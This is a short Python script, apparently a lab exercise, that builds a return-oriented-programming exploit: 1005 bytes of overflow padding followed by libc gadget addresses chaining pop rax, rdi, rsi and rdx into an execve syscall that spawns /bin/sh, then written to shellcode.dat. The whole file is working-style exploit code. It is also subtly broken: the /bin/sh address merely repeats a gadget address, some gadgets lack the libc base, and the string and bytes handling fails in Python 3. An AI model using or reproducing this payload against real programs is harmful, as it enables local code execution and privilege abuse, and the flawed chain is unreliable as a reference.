#!/usr/bin/python
import struct
import binascii

LIBC_OFFSET = 0x7ffff7a3a000

## rax ##
# The following gadget in libc allows us to pop a 64-bit value from the stack and store it in rax
g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
d1 = 59 # initialization of rax

## rdi ##
g2 = LIBC_OFFSET + 0x1b96 # pop rdi ; ret
d2 = LIBC_OFFSET + 0x1b96 # address of /bin/sh

## rsi ##
g3 = 0x000000000001eda3 # pop rsi ; ret
d3 = 0 #Given: rsi initialized with NULL

## rdx ##
g4 = 0x000000000003a899 # pop rdx ; ret
d4 = 0 #Given: rdx initialized with NULL

## syscall ##
g5 = 0x0000000000002f16 # syscall ; ret


# In order to achieve a Segmentation Fault, we need to give the buffer an input bigger than 1000 
shellcode = 'A'*(1005)

shellcode += struct.pack('<q', g1)
shellcode += struct.pack('<q', d1)
shellcode += struct.pack('<q', g2)
shellcode += struct.pack('<q', d2)
shellcode += struct.pack('<q', g3)
shellcode += struct.pack('<q', d3)
shellcode += struct.pack('<q', g4)
shellcode += struct.pack('<q', d4)
shellcode += struct.pack('<q', g5)

print ("shellcode: "+ shellcode)
with open("shellcode.dat", "wb") as f:
    f.write(shellcode)
print (binascii.hexlify(shellcode))
print ("g1: %x" % (g1))